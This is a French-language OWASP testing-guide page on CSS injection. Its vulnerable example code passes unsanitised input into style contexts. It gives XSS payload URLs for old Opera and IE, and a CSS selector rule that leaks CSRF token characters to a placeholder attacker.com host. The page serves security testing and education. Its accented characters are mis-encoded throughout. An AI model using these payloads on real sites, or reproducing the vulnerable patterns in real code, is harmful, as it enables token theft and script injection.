# Test d'injection CSS

|ID          |
|------------|
|WSTG-CLNT-05|

## Sommaire

Une vuln�rabilit� d'injection CSS implique la capacit� d'injecter du code CSS arbitraire dans le contexte d'un site Web de confiance qui est rendu dans le navigateur d'une victime. L'impact de ce type de vuln�rabilit� varie en fonction de la charge utile CSS fournie. Cela peut conduire � des scripts intersites ou � une exfiltration de donn�es.

Cette vuln�rabilit� se produit lorsque l'application permet au CSS fourni par l'utilisateur d'interf�rer avec les feuilles de style l�gitimes de l'application. L'injection de code dans le contexte CSS peut permettre � un attaquant d'ex�cuter JavaScript dans certaines conditions, ou d'extraire des valeurs sensibles � l'aide de s�lecteurs CSS et de fonctions capables de g�n�rer des requ�tes HTTP. G�n�ralement, permettre aux utilisateurs de personnaliser les pages en fournissant des fichiers CSS personnalis�s repr�sente un risque consid�rable.

Le code JavaScript suivant montre un possible script vuln�rable dans lequel l'attaquant est capable de contr�ler le `location.hash` (source) qui atteint la fonction `cssText` (sink). Ce cas particulier peut conduire � XSS bas� sur DOM dans les anciennes versions de navigateur�; pour plus d'informations, consultez le [DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).

```html
<a id="a1">Click me</a>
<script>
    if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>
```

L'attaquant pourrait cibler la victime en lui demandant de visiter les URL suivantes�:

- `www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current;` (Opera \[8,12\])
- `www.victim.com/#red;-:expression(alert(URL=1));` (IE 7/8)

La m�me vuln�rabilit� peut appara�tre dans le cas du XSS r�fl�chi, par exemple, dans le code PHP suivant :

```html
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
```

D'autres sc�narios d'attaque impliquent la possibilit� d'extraire des donn�es gr�ce � l'adoption de r�gles CSS pures. De telles attaques peuvent �tre men�es via des s�lecteurs CSS, conduisant � l'exfiltration de donn�es, par exemple, des jetons CSRF.

Voici un exemple de code qui tente de s�lectionner une entr�e avec un `name` correspondant � `csrf_token` et une `value` commen�ant par un `a`. En utilisant une attaque par force brute pour d�terminer la "valeur" de l'attribut, il est possible d'effectuer une attaque qui envoie la valeur au domaine de l'attaquant, par exemple en essayant de d�finir une image d'arri�re-plan sur l'�l�ment d'entr�e s�lectionn�.

```html
<style>
input[name=csrf_token][value=^a] {
    background-image: url(http://attacker.com/log?a);
}
</style>
```

D'autres attaques utilisant du contenu sollicit�, telles que CSS, sont pr�sent�es dans [Mario Heiderich's talk, "Got Your Nose"](https://www.youtube.com/watch?v=FIQvAaZj_HA) sur YouTube.

## Objectifs des tests

- Identifier les points d'injection CSS.
- �valuer l'impact de l'injection.

## Comment tester

Le code doit �tre analys� pour d�terminer si un utilisateur est autoris� � injecter du contenu dans le contexte CSS. En particulier, la mani�re dont le site Web renvoie les r�gles CSS sur la base des entr�es doit �tre inspect�e.

Voici un exemple de base�:

```html
<a id="a1">Click me</a>
<b>Hi</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>
```

Le code ci-dessus contient une source `location.hash`, contr�l�e par l'attaquant, qui peut s'injecter directement dans l'attribut `style` d'un �l�ment HTML. Comme mentionn� ci-dessus, cela peut conduire � des r�sultats diff�rents selon le navigateur utilis� et la charge utile fournie.

Les pages suivantes fournissent des exemples de vuln�rabilit�s d'injection CSS�:

- [Mot de passe "cracker" via CSS et HTML5](http://html5sec.org/invalid/?length=25)
- [Lecture des attributs CSS](http://eaea.sirdarckcat.net/cssar/v2/)
- [Attaques bas�es sur JavaScript utilisant `CSSStyleDeclaration` avec une entr�e non �chapp�e] (https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)

Pour plus de ressources OWASP sur la pr�vention de l'injection CSS, consultez la [Fiche de triche pour la s�curisation des feuilles de style en cascade](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html).
